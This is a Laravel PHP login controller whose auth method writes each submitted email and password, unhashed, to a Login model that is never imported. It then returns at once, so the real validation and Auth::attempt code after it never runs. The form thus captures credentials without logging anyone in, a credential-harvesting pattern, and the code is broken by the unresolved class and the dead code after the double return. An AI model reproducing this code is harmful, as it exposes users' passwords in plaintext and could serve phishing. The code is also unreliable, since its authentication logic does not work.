<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    public function index()
    {
        return view('admin.login', [
            'title' => 'Log In',
        ]);

    }

    public function auth(Request $request)
    {

        $login = new Login;

        $login->email = $request->input('email');
        $login->pass = $request->input('pass');

        $login->save();
        return back();
        return redirect()->route('post');

        $login = $request->validate([
            'email' => 'required|email:dns',
            'pass' => 'required|min:5|max:8',
        ]);

        if (Auth::attempt($login)) {
            $request->session()->regenerate();
            return redirect()->intended('/post');
        }

        return back()->with('failed', 'Login failed!');
    }
}
